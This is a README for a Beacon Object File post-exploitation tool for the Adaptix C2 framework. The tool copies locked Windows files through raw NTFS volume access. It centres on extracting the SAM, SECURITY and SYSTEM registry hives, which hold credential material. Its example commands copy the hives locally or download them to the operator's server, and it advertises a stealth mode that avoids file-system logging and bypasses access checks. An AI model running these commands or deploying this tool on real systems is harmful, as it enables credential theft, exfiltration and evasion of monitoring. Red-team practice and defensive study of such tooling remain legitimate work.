# UnderlayCopy-BOF
> #### Developed for [@Adaptix-Framework](https://github.com/Adaptix-Framework)
<br>

A low-level file copy tool ported to BOF format. Copies files using direct NTFS volume access, bypassing file locks and access restrictions:
- Copy locked files (SAM, SECURITY, SYSTEM registry hives)
- Two copy modes: MFT (Master File Table) and Metadata (FSCTL_GET_RETRIEVAL_POINTERS)
- Direct volume access using NtCreateFile/NtReadFile/NtWriteFile (stealth mode)
- Support for sparse files and data runs
- Save to disk or download to server
- Automatic filename generation for downloads (HOSTNAME_FILENAME.hive format)

```
underlaycopy <mode> <source> [-w destination] [--download]
```

#### Arguments:
- `mode`: Copy mode - `MFT` or `Metadata`
  - `MFT`: Reads file data directly from MFT records and data runs. Best for locked files (SAM, SECURITY, SYSTEM)
  - `Metadata`: Uses FSCTL_GET_RETRIEVAL_POINTERS to get file extents. Faster but may fail on locked files
- `source`: Source file path to copy (e.g., `C:\Windows\System32\config\SAM`)
- `-w destination`: Destination file path (required if `--download` is not used)
- `--download`: Download file to server instead of saving to disk. File will be saved as `HOSTNAME_FILENAME.hive` on the server

#### Features:
- **Bypass file locks**: Copy files that are locked by the system (registry hives, active processes)
- **Stealth mode**: Uses low-level NTFS APIs (NtCreateFile, NtReadFile, NtWriteFile) to minimize logging
- **Sparse file support**: Handles sparse clusters correctly (writes zeros for sparse regions)
- **Two copy modes**: 
  - MFT mode: Direct MFT record parsing - works on locked files
  - Metadata mode: Uses Windows API for extent retrieval - faster but requires file handle
- **Memory-efficient**: Uses 64KB buffers for I/O operations
- **Secure cleanup**: Clears sensitive data from memory after operations

#### Examples:
```
# Copy locked SAM registry hive using MFT mode (recommended for locked files)
underlaycopy MFT C:\Windows\System32\config\SAM -w C:\temp\SAM_copy

# Copy file using Metadata mode (faster for unlocked files)
underlaycopy Metadata C:\Windows\System32\notepad.exe -w C:\temp\notepad_copy.exe

# Download locked SECURITY hive to server (saved as HOSTNAME_SECURITY.hive)
underlaycopy MFT C:\Windows\System32\config\SECURITY --download

# Download SYSTEM hive with custom filename
underlaycopy MFT C:\Windows\System32\config\SYSTEM --download -w SYSTEM_backup
```

#### Technical Details:
- **MFT Mode**: 
  - Reads NTFS boot sector to locate MFT
  - Gets file MFT record number from GetFileInformationByHandle
  - Parses MFT record to extract $DATA attribute
  - Reads data runs and copies clusters directly from volume
  - Handles resident data (small files stored in MFT) and non-resident data (data runs)
  
- **Metadata Mode**:
  - Opens source file with FILE_FLAG_BACKUP_SEMANTICS
  - Uses FSCTL_GET_RETRIEVAL_POINTERS to get file extents
  - Copies data directly from volume using extent LCNs (Logical Cluster Numbers)
  - May fail on locked files that cannot be opened

- **Volume Access**:
  - Opens volume using NtCreateFile with \??\C: path
  - Reads directly from disk sectors using NtReadFile
  - Bypasses file system locks and access checks

#### Use Cases:
- Extracting locked registry hives (SAM, SECURITY, SYSTEM) for offline analysis
- Copying files locked by active processes
- Stealth file operations without triggering file system logging
- Bypassing access restrictions on system files
